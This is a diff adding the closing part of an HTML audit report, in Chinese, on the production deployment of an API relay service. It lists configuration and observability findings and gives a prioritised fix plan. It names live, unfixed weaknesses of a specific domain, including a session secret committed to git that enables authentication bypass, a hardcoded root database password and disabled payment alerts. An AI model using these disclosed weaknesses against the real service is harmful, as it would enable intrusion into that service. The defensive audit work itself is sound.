+        <div class="check-item"><span class="check">✓</span> 计费写放大已修复并部署生效（BATCH_UPDATE + AGENT_HOOK_ASYNC 均 ON，无 config drift）</div>
+        <div class="check-item"><span class="check">✓</span> 上游缓存到位：token/user/channel 走 Redis + 内存缓存，仪表盘预聚合</div>
+        <div class="check-item"><span class="check">✓</span> SSE 流式正常：app 在 relay/helper/common.go:54 设 X-Accel-Buffering:no，nginx 无需 proxy_buffering off</div>
+        <div class="check-item"><span class="check">✓</span> 持久化取舍合理：flush_log=2 + sync_binlog=0，不做每事务 fsync（单机可接受）</div>
+        <div class="check-item"><span class="check">✓</span> agent_plan_expiry 循环是正确范例（索引 status+expire_at + LIMIT 500）</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ 配置维度 ══════════ -->
+  <h3 class="section-title" id="configuration">⚙️ 配置 Configuration</h3>
+  <div class="card">
+    <div class="card-header">🧭 覆盖说明</div>
+    <div class="card-body">
+      <p><strong>覆盖度：</strong> High</p>
+      <p><strong>已检视证据：</strong> 全读 deploy/docker-compose.test.yml、.env.test.example、deploy/ops/*.sh（deploy/lib/backup/restore/rollback/healthcheck/reconcile）、deploy/nginx/*.conf、根 compose、Dockerfile*、makefile；Go 侧 common/{init,env,crypto}.go、wire.go、cors.go、main.go 会话/gin/CORS；线上只读：容器 env 键名、行为开关值、MySQL 运行参数、live nginx vhost、host 监听、.env 键名（仅名不取值）。</p>
+      <p><strong>排除 / 局限：</strong> Cloudflare 侧配置（SSL 模式/WAF/安全头/apex 规则）我方不可及——若干 nginx 发现的爆炸半径取决于它；上游连接池/relay 超时旋钮未逐项枚举（留上游默认，合理）。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">发现 <span style="font-weight:400;font-size:13px;color:var(--text-secondary)">· 涉及 5 条（配置主责；另贡献于安全/发布评分）</span></div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>发现</th><th style="width:100px">严重程度</th><th style="width:100px">状态</th></tr></thead>
+          <tbody>
+            <tr><td>RISK_DEFAULT_RPM=60 线上在跑、与文档“应为 0/停用”矛盾（每用户限 ~1 req/s），值烤进提交的 compose → 每次 deploy.sh 静默重施，即便运维改过 0（docker-compose.test.yml:20-21）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>deploy.sh 把整棵 Mac 工作树（含未提交 WIP）tar 到生产，无 clean/diff 守卫；唯一红线是已删栈名恒过（deploy.sh:92-101,44-45）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>线上 nginx 仍指死后端：/auth/→127.0.0.1:8180（退役）、:80 api.wedreamhub.com→127.0.0.1:3000（已删栈）→ 502 / 从 repo 恢复 nginx 会重引死路由</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>.env.test.example 与文档规定一大段退役 auth-service/AUTH_WXPAY_* 配置（app 已不读），而真正 load-bearing 且安全关键的 SESSION_SECRET 反而缺失 → 运维分不清哪些生效</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>根 docker-compose.yml / .dev.yml 携带 123456 默认 DB/Redis 密码（非部署路径，但是裸 docker compose up 的目标）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p class="small" style="padding:12px 24px 0"><em>另：发现 #1（git 提交的 SESSION_SECRET）、#4（guard_not_prod 倒置）、安全表中的 MySQL root 密码、可观测表中的日志无轮转，其配置根因均在本维度，已在对应处展开。</em></p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">✅ 已验证良好</div>
+    <div class="card-body">
+      <div class="check-list">
+        <div class="check-item"><span class="check">✓</span> 密钥文件卫生好：.gitignore 排除 .env/.env.*/*.pem，git 历史无提交的 .env/私钥</div>
+        <div class="check-item"><span class="check">✓</span> 网络暴露收敛：app 仅 127.0.0.1:3100 回环，MySQL/Redis 未对 host 发布，3306 未对公网暴露</div>
+        <div class="check-item"><span class="check">✓</span> client_max_body_size 200m 适配大 LLM 请求体；proxy_read_timeout 300s 适配流式</div>
+        <div class="check-item"><span class="check">✓</span> CF Origin CA 证书（有效期至 2041）；SSH 仅密钥登录</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ 可观测性维度 ══════════ -->
+  <h3 class="section-title" id="observability">🩺 可观测性 Observability</h3>
+  <div class="card">
+    <div class="card-header">🧭 覆盖说明</div>
+    <div class="card-body">
+      <p><strong>覆盖度：</strong> High（按单机小栈体量裁剪建议，不强套企业级遥测）</p>
+      <p><strong>已检视证据：</strong> 全读 internal/alert/*、reconcile 循环+心跳+history+HTTP、breakage repo/loop、健康端点+路由、支付回调+入账日志点、compose+ops 脚本；线上：docker inspect（健康检查/日志驱动/重启数）、DB 心跳、告警配置、容器日志采样、磁盘、crontab。</p>
+      <p><strong>排除 / 局限：</strong> wallet/tokenplan/risk/moderation 信号密度以 grep 计数 + 抽读；未在运行时触发失败回调；Redis 持久化/淘汰作边界。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">发现 <span style="font-weight:400;font-size:13px;color:var(--text-secondary)">· 11 条（2 High · 5 Medium · 4 Low）</span></div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>发现</th><th style="width:100px">严重程度</th><th style="width:100px">状态</th></tr></thead>
+          <tbody>
+            <tr><td>应用内告警在生产被禁用，Critical 支付告警被静默丢弃（详见发现 #5）</td><td><span class="badge badge-high">High</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>对账循环停摆/失败无主动告警，线上每 5 分钟 3 笔订阅失败（详见发现 #6）</td><td><span class="badge badge-high">High</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>healthcheck.sh 每次探测退役 auth-service 必失败 2 项 → “狼来了”训练运维忽视、掩盖真故障，且 cron 无 ALERT_WEBHOOK 只写本地文件（healthcheck.sh:41-63）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>/api/status 只证进程活（config dump，不查 DB/Redis），真实依赖 ping 在 admin 门后，compose/docker 无 healthcheck → DB 池死/Redis 空时仍报 success</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>日志无轮转：docker json-file 无 max-size + app oneapi-*.log 永不删 → 无界增长，满盘则 MySQL 写失败连累支付/计费</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>支付成功入账/激活 + PAY_AMOUNT_MISMATCH 篡改拒绝均不记日志（wallet/tokenplan/risk/moderation 各 0 条日志）→ “付了没到账”“有人篡改金额”无法日志检索</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>Creem 充值路径明文记录 PII（客户邮箱/姓名/完整 webhook body+签名）；Creem 疑为次要/休眠 provider，路径启用即泄（topup_creem.go:322,38）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>系统/回调日志无 request-id（[GIN] 访问日志有，拼不起来）→ 单笔支付难追踪（common/sys_log.go；payment_inprocess.go 用 SysLog 而非 logger.LogWarn(ctx)）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>redeploy 丢全部日志（app 无 logs 卷，重建即弃）→ 部署后事故取证无历史</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>无聚合指标（无 /metrics）+ GORM record-not-found 噪声每请求 dump SQL → 抬高日志量、埋没真错误</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>定价页仍把 mock-stats 的编造 30 天可用率/延迟/吞吐当真实指标渲染给终端用户、无免责（回归 #11 部分修）——站点已公开上线，风险面比上次更大</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">✅ 已验证良好（单机 MVP 的可观测基础其实高于平均）</div>
+    <div class="card-body">
+      <div class="check-list">
+        <div class="check-item"><span class="check">✓</span> 上次 High #2（额度沉淀监控读死列 used_usd 恒显 0）已修：读侧全改 nativeUsedUSD 关联真实用量</div>
+        <div class="check-item"><span class="check">✓</span> [GIN] 访问日志带 request-id + 状态码 + 延迟，可用于事后分析</div>
+        <div class="check-item"><span class="check">✓</span> 对账有心跳表 + 历史表 + admin 视图（缺的是主动告警，不是数据）</div>
+        <div class="check-item"><span class="check">✓</span> 告警模块本身设计良好（邮件/webhook + 去重），SMTP 已配可投递（缺的只是开关）</div>
+        <div class="check-item"><span class="check">✓</span> 有每日备份 + 每 5 分钟健康巡检 cron；容器零崩溃重启、磁盘 20%、负载 0.01</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ 修复顺序 ══════════ -->
+  <h3 class="section-title" id="fix-order">🎯 修复顺序</h3>
+  <div class="card">
+    <div class="card-header">
+      <span>⚡ 立即（当天 · 停血）</span>
+      <span class="badge badge-high">最高优先</span>
+    </div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th style="width:40px">#</th><th>修复</th><th style="width:90px">工作量</th><th>风险 / 说明</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>轮换并从 compose 移除 git 里的 SESSION_SECRET/CRYPTO_SECRET，改 ${VAR:?} 强制注入；init.go 加拒空/占位/低熵</td><td>1–2h</td><td>消除认证绕过；唯一副作用是用户强制重登</td></tr>
+            <tr><td>2</td><td>后台开启 breakage_alert_enabled + 收件人，并加“告警关闭”启动可见性</td><td>0.5h+1h</td><td>让支付卡单等 Critical 告警真能发出（当前全被丢弃）</td></tr>
+            <tr><td>3</td><td>修 guard_not_prod 指向 newapi_test，破坏性脚本加 I_UNDERSTAND_THIS_IS_PROD 门</td><td>1–2h</td><td>防止 restore.sh 误覆盖生产库</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">
+      <span>📅 本周（要害闭合）</span>
+      <span class="badge badge-medium">高优先</span>
+    </div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th style="width:40px">#</th><th>修复</th><th style="width:90px">工作量</th></tr></thead>
+          <tbody>
+            <tr><td>4</td><td>页脚渲染接入已打包的 DOMPurify + 服务端 Footer 白名单净化</td><td>0.5d</td></tr>
+            <tr><td>5</td><td>AGT 订单购买时校验 slug + 补 AGT 对账兜底/告警 + AnomalyCount 纳入 SUB/AGT</td><td>0.5–1.5d</td></tr>
+            <tr><td>6</td><td>删 healthcheck.sh 退役 auth-service 检查 + 接 ALERT_WEBHOOK；修 nginx :80 api 与 /auth 死后端 + 同步 deploy/nginx</td><td>1h</td></tr>
+            <tr><td>7</td><td>对账加陈旧心跳/失败计数主动告警 + runReconcileOnce 加超时</td><td>3–4h</td></tr>
+            <tr><td>8</td><td>SUB 对账加 LIMIT + pending 过期→failed；InitBatchUpdater 加 SIGTERM flush</td><td>0.5d+2h</td></tr>
+            <tr><td>9</td><td>MySQL root 密码移 .env + 轮换；compose/app 加日志轮转 max-size + 老 log 清理</td><td>1–2h</td></tr>
+            <tr><td>10</td><td>支付回调加成功/重放结构化日志 + PAY_AMOUNT_MISMATCH 独立 WARN 含 IP；去 Creem PII 日志</td><td>3h</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">
+      <span>🗓 排期（性能扩容 + 卫生）</span>
+      <span class="badge badge-low">中优先</span>
+    </div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th style="width:40px">#</th><th>修复</th><th style="width:90px">工作量</th></tr></thead>
+          <tbody>
+            <tr><td>11</td><td>ON 配置下重新压测 /v1，建立当前吞吐基线（旧 31rps 已作废）</td><td>0.5d</td></tr>
+            <tr><td>12</td><td>请求级 memo 化 userTenantID（每请求解析一次，hook 复用）+ 只读配置小缓存</td><td>0.5–1d</td></tr>
+            <tr><td>13</td><td>加索引：tokenplan_subscriptions(status,expire_at)、agent_earning_logs(tenant_id,created_at) 等</td><td>0.5d</td></tr>
+            <tr><td>14</td><td>连接池 SQL_MAX_OPEN_CONNS 调至 ≤120（低于 151）；buffer pool 提到 4–5GB + 日志表保留策略</td><td>15min+设计</td></tr>
+            <tr><td>15</td><td>前端：markdown/katex 懒加载、去 recharts/shiki 死依赖、启用列表虚拟化；开 slow_query_log 定位慢 SQL</td><td>1–2d</td></tr>
+            <tr><td>16</td><td>定价页对编造的可用率/延迟/吞吐加“示例数据”角标或隐藏（回归 #11 收尾）；配异地备份</td><td>0.5d</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- Quick Wins -->
+  <h3 class="section-title">⚡ 速赢清单（≤30 分钟 / 项，高性价比）</h3>
+  <div class="win-grid">
+    <div class="win-card">
+      <div class="win-title">开启告警开关</div>
+      <div class="win-meta">后台设 breakage_alert_enabled=true + 收件人 · 30min · 让支付告警从“被丢弃”变“能发出”</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">修生产护栏栈名</div>
+      <div class="win-meta">lib.sh PROD_STACK=newapi_test · 15min · 防误删生产库</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">删 healthcheck 死检查 + 接 webhook</div>
+      <div class="win-meta">去 auth-service 两检查 · 30min · 消除“狼来了”、让真故障能推送</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">RISK_DEFAULT_RPM 与文档对齐</div>
+      <div class="win-meta">compose 改 ${:-0} 或议定值 · 15min · 停止每部署静默限流</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">加 docker 日志轮转</div>
+      <div class="win-meta">compose logging max-size:50m max-file:5 · 15min · 防写爆磁盘拖垮 MySQL</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">连接池右调</div>
+      <div class="win-meta">SQL_MAX_OPEN_CONNS≤120 · 15min · 防尖峰 Too many connections</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">nginx :80 api 改指 3100</div>
+      <div class="win-meta">删 /auth 死块 · 30min · 消除 502 死后端</div>
+    </div>
+    <div class="win-card">
+      <div class="win-title">开 slow_query_log</div>
+      <div class="win-meta">long_query_time 降到 1s · 15min · 让索引优化有生产数据支撑</div>
+    </div>
+  </div>
+
+  <div style="text-align:center;padding:40px 0 20px;color:var(--text-secondary);font-size:12px">
+    Fuck My Shit Mountain v1.0 · newapi628 线上要害专项审计 · 2026-07-14 · 基线 d1783f9 · 主审计员 + 6 并行子审计员（安全/稳定/性能/配置/可观测 + 33 条回归复核）· 源码 + 服务器只读实地取证 · 仅审计不改代码
+  </div>
+
+</div>
+
+<script>
+  const sections = document.querySelectorAll('[id]');
+  const navLinks = document.querySelectorAll('.sidebar-nav a');
+
+  const observer = new IntersectionObserver((entries) => {
+    let activeId = null;
+    entries.forEach(entry => {
+      if (entry.isIntersecting) activeId = entry.target.id;
+    });
+    if (activeId) {
+      navLinks.forEach(a => {
+        a.classList.toggle('active', a.getAttribute('href') === '#' + activeId);
+      });
+    }
+  }, { rootMargin: '-10% 0px -60% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+
+  navLinks.forEach(a => {
+    a.addEventListener('click', function(e) {
+      e.preventDefault();
+      const target = document.querySelector(this.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
+</body>
+</html>
